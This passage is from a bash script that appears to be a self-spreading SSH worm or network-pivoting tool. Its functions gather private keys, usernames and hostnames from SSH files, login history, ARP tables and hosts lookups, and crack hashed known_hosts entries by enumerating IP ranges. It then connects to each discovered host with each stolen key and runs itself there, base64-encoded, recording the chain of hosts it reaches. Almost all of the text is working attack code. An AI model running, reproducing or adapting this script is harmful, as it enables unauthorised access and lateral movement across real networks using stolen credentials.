[[ -n "$home_user" ]] && add_ssh_dest "$home_user@$cline_val"
;;
"hostname")
add_ssh_host "$cline_val"
[[ -n "$home_user" ]] && add_ssh_dest "$home_user@$cline_val"
;;
"user")
add_ssh_user "$cline_val"
;;
"identityfile")
check_potential_key_files "$cline_val" "$home_folder"
;;
esac
done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" 2>/dev/null | sort | uniq)
done < <(${s} find -L "$home_folder/.ssh" -type f 2>/dev/null)
done
}
find_user_from_file() {
local home_folder
for home_folder in "${!home_folders[@]}"; do
if [[ "$1" == "$home_folder"* ]]; then
basename -- "$home_folder"
return
fi
done
}
find_from_authorized_keys() {
local ssh_file
for ssh_file in "${!ssh_files[@]}"; do
local ssh_address
local home_user
[[ -z "$ssh_file" ]] && continue
home_user="$(find_user_from_file "$ssh_file")"
while IFS= read -r ssh_address; do
local ssh_host
[[ -z "$ssh_address" ]] && continue
while IFS= read -r ssh_host; do
add_ssh_host "$ssh_host"
[[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
done < <(echo "$ssh_address" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
done < <(${s} grep -F 'from=' -- "$ssh_file" 2>/dev/null | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
done
}
find_from_last() {
local ssh_dest
last -aiw >/dev/null 2>&1 || return
while IFS= read -r ssh_dest; do
add_ssh_dest "$ssh_dest"
done < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\./ {print $1":"$NF}' | sort | uniq)
}
find_from_known_hosts() {
local ssh_file
for ssh_file in "${!ssh_files[@]}"; do
local known_host_line
local home_user
home_user="$(find_user_from_file "$ssh_file")"
while IFS= read -r known_host_line; do
local ssh_host
local ssh_user
local ssh_dest
[[ -z "$known_host_line" ]] && continue
ssh_user="$(echo "$known_host_line" | grep -F -m 1 '@' | awk -F"@" '{print $1}')"
ssh_host="$(echo "$known_host_line" | grep -F -m 1 -v '@')"
ssh_dest="$(echo "$known_host_line" | grep -m 1 -oE "$allowed_users_chars"'@[^ :]+')"
add_ssh_user "$ssh_user"
add_ssh_host "$ssh_host"
add_ssh_dest "$ssh_dest"
[[ -n "$home_user" && -n "$ssh_host" ]] && add_ssh_dest "$home_user@$ssh_host"
done < <(${s} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort | uniq)
done
}
find_from_hosts() {
local ssh_host
while IFS= read -r ssh_host; do
add_ssh_host "$ssh_host"
done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort | uniq)
while IFS=": " read -r _ ssh_host; do
add_ssh_host "$ssh_host"
done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort | uniq)
}
find_arp_neighbours() {
local ssh_host
while IFS= read -r ssh_host; do
add_ssh_host "$ssh_host"
done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq)
while IFS= read -r ssh_host; do
add_ssh_host "$ssh_host"
done < <(arp -a 2>/dev/null | awk -F"\\\(|\\\)" '{print $2}' | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq)
}
find_d_block() {
local octets
local i
local current_ip
for current_ip in "${!current_ips[@]}"; do
IFS='.' read -ra octets < <(echo "$current_ip")
[[ ${#octets[@]} -eq 4 ]] || continue
for ((i=0; i<256; i++)); do
add_ssh_host "${octets[0]}.${octets[1]}.${octets[2]}.$i"
done
done
}
find_from_prev_dest() {
local chain_sl_dest
local ssh_user
local ssh_host
chain_sl_dest="${hosts_chain%[*}"
chain_sl_dest="${chain_sl_dest##*->}"
add_ssh_dest "$chain_sl_dest"
add_ssh_dest "$this_dest"
[[ -z "$SSH_CONNECTION" ]] && return
ssh_host="${SSH_CONNECTION%% *}"
add_ssh_host "$ssh_host"
}
find_from_ignore_list() {
local ssh_dest
for ssh_dest in "${!ignore_list_array[@]}"; do
add_ssh_dest "$ssh_dest"
done
}
find_from_hashed_known_hosts() {
local octets
local ssh_file
local current_ip
for ssh_file in "${!ssh_files[@]}"; do
local hashed_number
local home_user
local ssh_host
local i
local j
local ss
[[ -z "$ssh_file" ]] && continue
ss=""
[[ ! -r "$ssh_file" ]] && ss="$s"
home_user="$(find_user_from_file "$ssh_file")"
hashed_number="$(${ss} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -Ec ':[a-zA-Z0-9]{2} \|1\|')"
[[ $hashed_number -lt 1 ]] && continue
for ssh_host in "${!ssh_hosts[@]}"; do
local found_hosts_count
found_hosts_count=0
[[ $hashed_number -lt 1 ]] && break
found_hosts_count="$(${ss} "${sshkeygen[@]}" "$ssh_file" -F "$ssh_host" 2>/dev/null | grep -cE 'Host .* found')" && ((hashed_number -= found_hosts_count)) && [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
done
[[ $hashed_number -lt 1 ]] && continue
for ssh_dest in "${!ignore_list_array[@]}"; do
local found_hosts_count
found_hosts_count=0
[[ $hashed_number -lt 1 ]] && break
ssh_host="${ssh_dest#*@}"
found_hosts_count="$(${ss} "${sshkeygen[@]}" "$ssh_file" -F "$ssh_host" 2>/dev/null | grep -cE 'Host .* found')" && ((hashed_number -= found_hosts_count)) && [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
done
[[ $hashed_number -lt 1 ]] && continue
for current_ip in "${!current_ips[@]}"; do
[[ $hashed_number -lt 1 ]] && break
IFS='.' read -ra octets < <(echo "$current_ip")
[[ ${#octets[@]} -eq 4 ]] || continue
if command -v xargs >/dev/null 2>&1; then
for i in {0..255}; do
[[ $hashed_number -lt 1 ]] && break
while IFS= read -r ssh_host; do
ssh_host="${ssh_host#*Host }"
ssh_host="${ssh_host%% found*}"
add_ssh_host "$ssh_host"
((hashed_number--))
[[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
done < <(
for j in {0..255}; do
echo "${octets[0]}.${octets[1]}.$j.$i"
done | xargs -P 0 -n 1 ${ss} ssh-keygen -f "$ssh_file" -F 2>/dev/null | grep -F '# Host')
done
else
for ((i=0; i<256; i++)); do
[[ $hashed_number -lt 1 ]] && break
for ((j=0; j<256; j++)); do
local found_hosts_count
found_hosts_count=0
[[ $hashed_number -lt 1 ]] && break
ssh_host="${octets[0]}.${octets[1]}.$i.$j"
[[ -v 'ssh_hosts["$ssh_host"]' || ${#ssh_hosts["$ssh_host"]} -gt 0 ]] && continue
found_hosts_count="$(${ss} "${sshkeygen[@]}" "$ssh_file" -F "$ssh_host" 2>/dev/null | grep -cE 'Host .* found')" && ((hashed_number -= found_hosts_count)) && [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
done
done
fi
done
done
}
find_all() {
retry_all_dests
find_home_folders
init_ssh_files
find_ssh_keys
find_ssh_keys_paths
find_from_bash_history
find_from_ssh_config
(( ${#priv_keys[@]} )) || fin
find_from_authorized_keys
find_from_last
find_from_known_hosts
find_from_hosts
find_arp_neighbours
find_d_block
find_from_prev_dest
find_from_ignore_list
find_from_hashed_known_hosts
}
combinate_users_hosts_aggressive() {
local ssh_user
local ssh_host
for ssh_host in "${interesting_hosts[@]}"; do
add_ssh_host "$ssh_host"
done
for ssh_user in "${interesting_users[@]}"; do
add_ssh_user "$ssh_user"
done
for ssh_dest in "${interesting_dests[@]}"; do
add_ssh_dest "$ssh_dest"
done
for ssh_host in "${!ssh_hosts[@]}"; do
for ssh_user in "${!ssh_users[@]}"; do
add_ssh_dest "$ssh_user@$ssh_host"
done
done
}
combinate_interesting_users_hosts() {
local ssh_user
local ssh_host
for ssh_dest in "${interesting_dests[@]}"; do
add_ssh_dest "$ssh_dest"
done
for ssh_user in "${interesting_users[@]}"; do
add_ssh_user "$ssh_user"
for ssh_host in "${!ssh_hosts[@]}"; do
add_ssh_dest "$ssh_user@$ssh_host"
done
done
for ssh_host in "${interesting_hosts[@]}"; do
add_ssh_host "$ssh_host"
for ssh_user in "${!ssh_users[@]}"; do
add_ssh_dest "$ssh_user@$ssh_host"
done
done
for ssh_host in "${interesting_hosts[@]}"; do
for ssh_user in "${interesting_users[@]}"; do
add_ssh_dest "$ssh_user@$ssh_host"
done
done
}
deduplicate_resolved_hosts_keys() {
local ssh_dest
declare -A valid_ssh_dests
declare -A resolved_hosts
local res
local use_mac
local to
command -v timeout >/dev/null 2>&1 && to="timeout $ssh_timeout"
if getent ahostsv4 -- 1.1.1.1 >/dev/null 2>&1; then
res="$to getent ahostsv4 --"
elif dscacheutil -q host -a name 1.1.1.1 >/dev/null 2>&1; then
res="$to dscacheutil -q host -a name"
use_mac="1"
else
printf "INTERNAL_MSG: command not found: RESOLVE (%s)\n" "$(uname -a 2>/dev/null)"
fin
fi
for ssh_dest in "${!ssh_dests[@]}"; do
local ssh_host
is_ssh_dest "$ssh_dest" || continue
ssh_host="${ssh_dest#*@}"
[[ -v 'resolved_hosts["$ssh_host"]' || ${#resolved_hosts["$ssh_host"]} -gt 0 ]] && continue
resolved_hosts["$ssh_host"]=1
($res "$ssh_host" > /dev/null 2>&1 &)
done
wait
resolved_hosts=()
for ssh_dest in "${!ssh_dests[@]}"; do
local ssh_user
local ssh_host
local resolved_ssh_host
is_ssh_dest "$ssh_dest" || continue
ssh_user="${ssh_dest%%@*}"
ssh_host="${ssh_dest#*@}"
if [[ -v 'resolved_hosts["$ssh_host"]' || ${#resolved_hosts["$ssh_host"]} -gt 0 ]]; then
:
else
local resolved_ssh_hosts
if [[ -n "$use_mac" ]]; then
resolved_ssh_hosts="$($res "$ssh_host" 2>/dev/null | awk '/ip_address:/{print $NF}')"
else
resolved_ssh_hosts="$($res "$ssh_host" 2>/dev/null | awk '/RAW/{print $1}')"
fi
for resolved_ssh_host in "${resolved_ssh_hosts[@]}"; do
if [[ "${resolved_ssh_host:0:1}" =~ [12] ]]; then
[[ "$resolved_ssh_host" =~ ^127\. ]] && resolved_ssh_host="127.0.0.1"
[[ -v '_ignored_hosts["$resolved_ssh_host"]' || ${#_ignored_hosts["$resolved_ssh_host"]} -gt 0 ]] && continue
resolved_hosts["$ssh_host"]+="$resolved_ssh_host "
else
[[ -n "$resolved_ssh_host" ]] && _ignored_hosts["$resolved_ssh_host"]=1
fi
done
fi
if [[ "${#resolved_hosts["$ssh_host"]}" -lt 7 ]]; then
_ignored_hosts["$ssh_host"]=1
continue
fi
for resolved_ssh_host in ${resolved_hosts["$ssh_host"]}; do
valid_ssh_dests["$ssh_user@$resolved_ssh_host"]=1
done
done
ssh_dests=()
for ssh_dest in "${!valid_ssh_dests[@]}"; do
add_ssh_dest "$ssh_dest"
done
}
is_file() {
local filename
filename="$1"
[[ -z "$filename" ]] && return 1
[[ -v 'files["$filename"]' || ${#files["$filename"]} -gt 0 ]] && return 0
[[ -v 'not_files["$filename"]' || ${#not_files["$filename"]} -gt 0 ]] && return 1
${s} test -s "$filename" && ${s} test -r "$filename" && ${s} test -f "$filename" && files["$filename"]=1 && return 0
not_files["$filename"]=1
return 1
}
is_dir() {
local dir_name
dir_name="$1"
[[ -z "$dir_name" ]] && return 1
[[ -v 'folders["$dir_name"]' || ${#folders["$dir_name"]} -gt 0 ]] && return 0
[[ -v 'not_folders["$dir_name"]' || ${#not_folders["$dir_name"]} -gt 0 ]] && return 1
${s} test -d "$dir_name" && ${s} test -r "$dir_name" && folders["$dir_name"]=1 && return 0
not_folders["$dir_name"]=1
return 1
}
is_ssh_user() {
local ssh_user
ssh_user="$1"
[[ -z "$ssh_user" ]] && return 1
[[ -v '_ignored_users["$ssh_user"]' || ${#_ignored_users["$ssh_user"]} -gt 0 ]] && return 1
[[ -v 'ssh_users["$ssh_user"]' || ${#ssh_users["$ssh_user"]} -gt 0 ]] && return 0
[[ "$ssh_user" =~ ^$allowed_users_chars$ ]] || return 1
return 0
}
is_ssh_host() {
local ssh_host
ssh_host="$1"
[[ -z "$ssh_host" ]] && return 1
[[ -v '_ignored_hosts["$ssh_host"]' || ${#_ignored_hosts["$ssh_host"]} -gt 0 ]] && return 1
[[ -v 'ssh_hosts["$ssh_host"]' || ${#ssh_hosts["$ssh_host"]} -gt 0 ]] && return 0
[[ "$ssh_host" =~ ^$allowed_host_chars+$ ]] || return 1
[[ "${ssh_host:0:1}" == "-" || "${ssh_host:0-1}" == "-" || "${ssh_host:0:1}" == "." || "${ssh_host:0-1}" == "." || "$ssh_host" == *"-."* || "$ssh_host" == *"--"* ]] && return 1
if [[ "$ssh_host" =~ ^[0-9.]+$ ]]; then
[[ "$ssh_host" =~ ^[0-9]+(\.[0-9]+){3}$ ]] || return 1
fi
return 0
}
is_ssh_dest() {
local ssh_user
local ssh_host
local ssh_dest
ssh_dest="$1"
[[ -z "$ssh_dest" ]] && return 1
ssh_dest="${ssh_dest,,}"
[[ -v '_ignored_dests["$ssh_dest"]' || ${#_ignored_dests["$ssh_dest"]} -gt 0 ]] && return 1
ssh_user="${ssh_dest%%@*}"
ssh_host="${ssh_dest#*@}"
is_ssh_host "$ssh_host" && is_ssh_user "$ssh_user" && return 0
return 1
}
add_ssh_user() {
local ssh_user
ssh_user="$1"
is_ssh_user "$ssh_user" && ssh_users["$ssh_user"]=1 && return 0
return 1
}
add_ssh_host() {
local ssh_host
ssh_host="$1"
is_ssh_host "$ssh_host" && ssh_hosts["$ssh_host"]=1 && return 0
return 1
}
add_ssh_dest() {
local ssh_dest
local ssh_host
local ssh_user
ssh_dest="$1"
ssh_dest="${ssh_dest,,}"
ssh_user="${ssh_dest%%@*}"
ssh_host="${ssh_dest#*@}"
is_ssh_dest "$ssh_dest" && ssh_dests["$ssh_dest"]=1 && ssh_hosts["$ssh_host"]=1 && ssh_users["$ssh_user"]=1 && return 0
return 1
}
rs_chained_print() {
printf "%s%*s%s->%s\n" "$indent" 1 "" "$1" "$2"
}
double_rs_chained_print() {
local ssh_dest
local ssh_host
local ssh_user
ssh_dest="$3"
ssh_user="${ssh_dest%%@*}"
ssh_host="${ssh_dest#*@}"
rs_chained_print "$1" "$3"
rs_chained_print "$2" "$ssh_user@($ssh_host)"
}
recursive_scan() {
declare -A retry_dests
declare -A retry_keys
local ssh_dest
local priv_key
local key_file
for ssh_dest in "${!ssh_dests[@]}"; do
local ssh_user
local ssh_host
ssh_user="${ssh_dest%%@*}"
ssh_host="${ssh_dest#*@}"
is_ssh_user "$ssh_user" || continue
is_ssh_host "$ssh_host" || continue
for priv_key in "${!priv_keys[@]}"; do
local t_hosts_chain
local t_hostnames_chain
local skip_this_dest
local line
local line_num
key_file="${priv_keys["$priv_key"]}"
[[ -v '_ignored_key_files["$key_file"]' || ${#_ignored_key_files["$key_file"]} -gt 0 ]] && continue
t_hosts_chain="${hosts_chain}[${s:+!}${key_file}]"
t_hostnames_chain="${hostnames_chain}[${s:+!}${key_file}]"
skip_this_dest=0
line_num=0
while IFS= read -r line; do
((line_num++))
if [[ "$line" == *"resolve hostname"* || "$line" == *"connect to "* ]]; then
_ignored_hosts["$ssh_host"]=1
skip_this_dest=1
break
fi
if [[ "$line" == *"Argument list too long"* ]]; then
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
rs_chained_print "$t_hosts_chain" "$ssh_dest [ARG_LIMIT:$(getconf -a 2>/dev/null | awk '/ARG_MAX/{print $NF; exit}'), $(printf "%s" "$ignore_list" | base64 | tr -d '\n')]"
printf "INTERNAL_MSG: ARG_LIMIT\n"
fin
fi
if [[ "$line" == "INTERNAL_MSG: ARG_LIMIT" ]]; then
printf "INTERNAL_MSG: ARG_LIMIT\n"
fin
fi
if [[ "$line" == *"Warning: Permanently added"* || "$line" == *"Permission denied"* || "$line" == *"contents do not match public"* || "$line" == *"load pubkey"* || "$line" == *"unable to resolve host"* || "$line" == *"warning: setlocale"* || "$line" == *"key_load_public: invalid format"* ]]; then
continue
fi
if [[ "$line" == *"Unable to negotiate with"* ]]; then
continue
fi
if [[ "$line" == "Warning: Identity file"* || "$line" == "Load key"* || "$line" == *"No such file or directory"* ]]; then
_ignored_key_files["$key_file"]=1
break
fi
if [[ "$line" == "INTERNAL_MSG: ignore list: "* ]]; then
local ignore_new
ignore_new="${line#*INTERNAL_MSG: ignore list: }"
if [[ "$ignore_list" != *"$ignore_new"* ]]; then
ignore_list+="$ignore_new"
fi
printf "%s\n" "$line"
continue
fi
if [[ "$line" == "INTERNAL_MSG: command not found: "* ]]; then
local missing_cmd
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
missing_cmd="${line#*INTERNAL_MSG: command not found: }"
rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,cmd,$missing_cmd]"
break
fi
if [[ "$line" == *"sh: bash"* ]]; then
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,cmd,bash]"
break
fi
if [[ "$line" == *"Segmentation fault"* || "$line" == *"cannot allocate"* || "$line" == *"core dumped"* ]]; then
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
rs_chained_print "$t_hosts_chain" "$ssh_dest [OoM]"
break
fi
if [[ "$line" == *"This account is currently not available"* ]]; then
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
rs_chained_print "$t_hosts_chain" "$ssh_dest [NoLogin]"
break
fi
if [[ "$line" == "Disallowed command" ]]; then
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
rs_chained_print "$t_hosts_chain" "$ssh_dest [GitLab]"
break
fi
if [[ "$line" == "Invalid command: "* || "$line" == "exec request failed on channel "* ]]; then
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
rs_chained_print "$t_hosts_chain" "$ssh_dest [GitHub]"
break
fi
if [[ "$line" == *"Broken pipe"* || "$line" == *"Timeout, server"* || "$line" == "Connection to"* || "$line" == "Read from remote host"* || "$line" == *"Connection closed by"* || "$line" == *" timed out"* || "$line" == *"Disconnected from"* || "$line" == *"Connection reset by"* || "$line" == *"closed by remote host"* || "$line" == *"kex_exchange_identification"* || "$line" == *"ssh_exchange_identification"* || "$line" == *"Bad remote protocol version identification"* || "$line" == *"Protocol major versions differ"* ]]; then
if [[ "$line_num" -le 3 ]]; then
if [[ "$line" != "Connection closed by"* && "$line" != "Connection to"* && "$line" != *"closed by remote host." ]]; then
_ignored_hosts["$ssh_host"]=1
fi
skip_this_dest=1
break
fi
retry_keys["$priv_key"]="$key_file"
retry_dests["$ssh_dest"]=1
rs_chained_print "$t_hosts_chain" "$ssh_dest [ConnErr]"
break
fi
if [[ "$line" == "Please login as the user"* ]]; then
local aws_ssh_user
double_rs_chained_print "$t_hosts_chain" "$t_hostnames_chain" "$ssh_dest"
aws_ssh_user="${line#*\"}"
aws_ssh_user="${aws_ssh_user%%\"*}"
if is_ssh_dest "$aws_ssh_user@$ssh_host"; then
rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,aws,$aws_ssh_user]"
if [[ ! -v 'ssh_dests["$aws_ssh_user@$ssh_host"]' || ${#ssh_dests["$aws_ssh_user@$ssh_host"]} -eq 0 ]]; then
retry_dests["$aws_ssh_user@$ssh_host"]=1
retry_keys["$priv_key"]="$key_file"
fi
else
rs_chained_print "$t_hosts_chain" "$ssh_dest [fail,aws,$line]"
fi
break
fi
if [[ "$line" == *"$t_hosts_chain"* || "$line" == *"$t_hostnames_chain"* ]]; then
printf "%s\n" "$line"
else
rs_chained_print "$t_hosts_chain" "$ssh_dest [line]: $line"
fi
done < <(${s} ssh "${ssh_options[@]}" -i "$key_file" -- "$ssh_dest" "echo 'printf \"%s\" \$1 | base64 -d | bash --noprofile --norc -s \$1 \$2 \$3 \$4 \$5' | bash --noprofile --norc -s -- '$script' '$(printf "%s" "$t_hosts_chain" | base64 | tr -d '\n')' '$ignore_list' '$ssh_dest' '$(printf "%s" "$t_hostnames_chain" | base64 | tr -d '\n')'" </dev/null 2>&1 | tr -d '\r')
[[ $skip_this_dest -eq 1 ]] && break
done
done
if [[ $use_find_from_ignore_list -eq 2 ]]; then
local ssh_dest
load_ignore_list_array
for ssh_dest in "${!ignore_list_array[@]}"; do
[[ -z "$ssh_dest" ]] && continue
[[ -v 'ssh_dests["$ssh_dest"]' || ${#ssh_dests["$ssh_dest"]} -gt 0 ]] && continue
retry_dests["$ssh_dest"]=1
done
for priv_key in "${!priv_keys[@]}"; do
key_file="${priv_keys["$priv_key"]}"
retry_keys["$priv_key"]="$key_file"
done
fi
(( ${#retry_dests[@]} )) || return
(( ${#retry_keys[@]} )) || return
[[ $retry_count -gt 0 ]] || return
((retry_count--))
ssh_dests=()
priv_keys=()
for ssh_dest in "${!retry_dests[@]}"; do
is_ssh_dest "$ssh_dest" && ssh_dests["$ssh_dest"]=1
done
for priv_key in "${!retry_keys[@]}"; do
[[ -v '_ignored_key_files["$priv_key"]' || ${#_ignored_key_files["$priv_key"]} -gt 0 ]] && continue
priv_keys["$priv_key"]="${retry_keys["$priv_key"]}"
done
(( ${#ssh_dests[@]} )) || return
(( ${#priv_keys[@]} )) || return
printf "%s%s: EXTERNAL_MSG: INFO: Trying again with %d dests and %s keys (attempts left: %d)\n" "$indent" "$hosts_chain" "${#ssh_dests[@]}" "${#priv_keys[@]}" "$retry_count"
recursive_scan
}
setup
exec_custom_cmds
find_all
combinate_users_hosts_aggressive
combinate_interesting_users_hosts
deduplicate_resolved_hosts_keys
(( ${#ssh_dests[@]} )) || fin
(( ${#priv_keys[@]} )) || fin
printf "%s%s: EXTERNAL_MSG: INFO: Beginning with %d dests and %d keys\n" "$indent" "$hosts_chain" "${#ssh_dests[@]}" "${#priv_keys[@]}"
recursive_scan
fin
MAIN_SCRIPT
)
printf "%s" "$THIS_SCRIPT" | bash --noprofile --norc
